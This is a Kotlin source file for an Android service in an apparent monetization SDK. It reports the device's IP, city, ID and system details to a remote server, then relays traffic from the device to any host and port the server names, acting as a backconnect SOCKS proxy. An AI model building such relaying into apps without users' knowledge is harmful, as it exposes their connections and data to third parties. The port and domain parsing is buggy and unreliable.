package net.monetizemyapp.android

import android.app.Service
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import net.monetizemyapp.di.InjectorUtils
import net.monetizemyapp.network.*
import net.monetizemyapp.network.model.base.ServerMessageEmpty
import net.monetizemyapp.network.model.response.IpApiResponse
import net.monetizemyapp.network.model.step0.Ping
import net.monetizemyapp.network.model.step0.Pong
import net.monetizemyapp.network.model.step1.Hello
import net.monetizemyapp.network.model.step1.HelloBody
import net.monetizemyapp.network.model.step2.Backconnect
import net.monetizemyapp.network.model.step2.Connect
import net.monetizemyapp.network.model.step2.ConnectBody
import net.monetizemyapp.network.socks.SocksServer
import net.monetizemyapp.toolbox.CoroutineContextPool
import net.monetizemyapp.toolbox.extentions.*
import retrofit2.HttpException
import retrofit2.Response
import java.io.IOException
import java.net.InetSocketAddress
import java.net.URL
import java.net.URLConnection
import java.nio.ByteBuffer
import kotlin.coroutines.CoroutineContext
import kotlin.experimental.and
import kotlin.experimental.or
import kotlin.math.abs

@ExperimentalStdlibApi
class ProxyService : Service(), CoroutineScope {
    private val lifecycleJob = Job()
    override val coroutineContext: CoroutineContext
        get() = CoroutineContextPool.network + lifecycleJob

    companion object {
        private val TAG: String = ProxyService::class.java.canonicalName ?: ProxyService::class.java.name
    }

    private val serverConnections = mutableListOf<TcpClient>()


    private val locationApi by lazy { InjectorUtils.Api.provideLocationApi() }

    private val mainTcpClient: TcpClient by lazy {
        InjectorUtils.TcpClient.provideServerTcpClient()
            .apply {
                listener = object : TcpClient.OnSocketResponseSimpleListener() {
                    override fun onNewMessage(client: TcpClient, message: String) {
                        logd(TAG, "mainTcpClient onNewMessage, message : $message")
                        val response = message.toObject()
                        logd(TAG, "mainTcpClient onNewMessage, response : $response")
                        when (response) {
                            is ServerMessageEmpty -> {
                                //logd(TAG, "response message is empty")
                            }
                            is Ping -> {
                                logd(TAG, "mainTcpClient response message is Ping")
                                client.sendMessage(Pong().toJson())
                            }
                            is Backconnect -> {
                                startNewBackconnectSession(response)
                                logd(TAG, "mainTcpClient response message is Backconnect")
                            }
                        }
                    }

                    override fun onError(client: TcpClient, error: String) {
                        loge(TAG, "mainTcpClient onError : $error")
                    }
                }
            }
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        startProxy()

        return START_STICKY
    }

    private fun startProxy() {

        logd(TAG, "StartProxy")

        val clientKey = getAppInfo()?.metaData?.getString("monetize_app_key")

        if (clientKey.isNullOrBlank()) {
            throw IllegalArgumentException("Error: \"monetize_app_key\" is null. Provide \"monetize_app_key\" in Manifest to enable SDK")
        }

        launch {

            val location: Response<IpApiResponse>? = try {
                locationApi.getLocation()
            } catch (ex: HttpException) {
                loge(TAG, "Location request error : ${ex.message}")
                null
            } catch (ex: IOException) {
                loge(TAG, "Location request error : ${ex.message}")
                null
            }

            location?.takeIf { it.isSuccessful }?.body()?.let {
                val message = Hello(
                    HelloBody(
                        clientKey,
                        it.query,
                        deviceId,
                        it.city,
                        "TEST",//it.countryCode,
                        getSystemInfo()
                    )
                )
                mainTcpClient.sendMessage(message.toJson())
            }
        }
    }

    private fun startNewBackconnectSession(backconnect: Backconnect) {
        launch {
            val newServerConnectionTcpClient = InjectorUtils.TcpClient.provideServerTcpClient()

            serverConnections.add(newServerConnectionTcpClient)
            val message = Connect(ConnectBody(backconnect.body.token))
            newServerConnectionTcpClient.sendMessageSync(message.toJson())

            logd(TAG, "startNewBackconnectSession: sendMessageSync, message = ${message.toJson()}")
            val firstBytesResponse = newServerConnectionTcpClient.waitForBytesSync()
            logd(TAG, "startNewBackconnectSession: waitForBytesSync, firstBytesResponse = ${firstBytesResponse.contentToString()}")

            newServerConnectionTcpClient.sendBytesSync(byteArrayOf(5, 0))
            logd(TAG, "startNewBackconnectSession: sendBytesSync, bytes = ${byteArrayOf(5, 0).contentToString()}")
            val requestBytes = newServerConnectionTcpClient.waitForBytesSync()
            logd(TAG, "tartNewBackconnectSession: waitForBytesSync, requestBytes = ${requestBytes.contentToString()}")
            logd(TAG, "tartNewBackconnectSession: waitForBytesSync(decode), requestMessage = ${requestBytes.decodeToString()}")

            val (ip, port) = parseSocksConnectionRequest(requestBytes)

            logd(TAG, "tartNewBackconnectSession: try to connect to backconnect ip = $ip, port = $port\n")
            val backConnectSocket = InjectorUtils.Sockets.provideSocketConnection(ip, port)
            val newBackConnectTcpClient = SocketTcpClient(backConnectSocket)

            // Return bytes, or error, to the client
            val status = if (requestBytes.isEmpty()) 5 else 0
            val statusResponseToServer = byteArrayOf(5, status.toByte(), 0, 0, 0, 0, 0, 0, 0)
            logd(TAG, "tartNewBackconnectSession: sendBytesSync, statusResponseToServer = ${statusResponseToServer.contentToString()} ")
            newServerConnectionTcpClient.sendBytesSync(statusResponseToServer)

            val serverResponseAfterStatus = newServerConnectionTcpClient.waitForBytesSync()
            logd(TAG, "tartNewBackconnectSession: waitForBytesSync, responseAfterStatus = ${serverResponseAfterStatus.contentToString()} ")
            logd(TAG, "tartNewBackconnectSession: waitForBytesSync, responseAfterStatus = ${serverResponseAfterStatus.decodeToString()} ")

            newBackConnectTcpClient.sendMessageSync(serverResponseAfterStatus.decodeToString())

            exchangeBytes(newServerConnectionTcpClient, newBackConnectTcpClient)

        }
    }

    private fun parseSocksConnectionRequest(bytes: ByteArray): Pair<String, Int> {
        logd(TAG, "parseSocksConnectionRequest\n")
        bytes.forEachIndexed { index, byte ->
            logd(
                TAG,
                "Field${index + 1} (${
                SocksServer.CONNECTION_FIELDS[index]?.get(SocksServer.FIELD_NAME_BYTE)
                }) is ${
                SocksServer.CONNECTION_FIELDS[index]?.get(byte)}\n"
            )
        }

        val ipAddress: String = when {
            bytes[SocksServer.CONNECTION_FIELD_ADDRESS_TYPE] == SocksServer.ADDRESS_TYPE_IPv4 ->
                ByteBuffer.wrap(bytes.copyOfRange(4, 8)).int.toIP()
            bytes[SocksServer.CONNECTION_FIELD_ADDRESS_TYPE] == SocksServer.ADDRESS_TYPE_IPv6 ->
                bytes.copyOfRange(4, 20).contentToString()
            else -> {
                val length = bytes.get(SocksServer.CONNECTION_FIELD_ADDRESS_TYPE + 1)
                bytes.copyOfRange(4, length.toInt()).contentToString()
            }
        }
        logd(TAG, "parseSocksConnectionRequest: Request IP Address = $ipAddress\n")
        val portBytes = bytes.takeLast(2).toByteArray()
        logd(TAG,"parseSocksConnectionRequest: Port Bytes = ${portBytes.contentToString()}")
        logd(TAG,"parseSocksConnectionRequest: Port UBytes = ${portBytes.toUByteArray().contentToString()}")
        val portByte = ((portBytes[0] and 0xff.toByte()) shl 8 or (portBytes[1] and 0xff.toByte()))
        val port = portByte.toInt()
        val uPort = portByte.toUByte().toInt()
        logd(TAG, "parseSocksConnectionRequest: Request portByte = $portByte\n")
        logd(TAG, "parseSocksConnectionRequest: Request port = $port\n")
        logd(TAG, "parseSocksConnectionRequest: Request uPort = $uPort\n")
        return Pair(ipAddress, port.takeIf{ it > 0 } ?: (uPort*2)+abs(port))

    }

    private fun exchangeBytes(serverConnectionClient: TcpClient, backConnectClient: TcpClient) {

        launch {
            val backConnectResponse = backConnectClient.waitForBytesSync()
            logd(TAG, "Received message from backconnect: message = $backConnectResponse")
            logd(TAG, "Received message from backconnect: message (decoded) = ${backConnectResponse.decodeToString()}")
            if (backConnectResponse.isNotEmpty()) {
                serverConnectionClient.sendBytesSync(backConnectResponse)
            }
        }
        launch {
            val serverConnectionResponse = serverConnectionClient.waitForBytesSync()
            logd(TAG, "Received message from server: message = $serverConnectionResponse")
            logd(TAG, "Received message from server: message (decoded) = ${serverConnectionResponse.decodeToString()}")
            if (serverConnectionResponse.isNotEmpty()) {
                backConnectClient.sendBytesSync(serverConnectionResponse)
            }
        }
    }

    /**
     * Connects to external server.
     * These bytes will be funneled to backconnect server
     */
    private fun createSocketExternal(address: InetSocketAddress): URLConnection {
        return URL("http://${address.hostName}:${address.port}").openConnection()
            .apply {
                connect()
            }
    }


/*private fun createSocketExternal(address: InetSocketAddress): Socket {
    val proxyAddress = InetSocketAddress(proxyHost, proxyPort)
    return Socket(Proxy(Proxy.Type.SOCKS), address)
}*/


    override fun onDestroy() {
        //sockets.forEach { it.close() }
        serverConnections.forEach {
            it.stop()
        }
        mainTcpClient.stop()
        lifecycleJob.cancel()
    }
}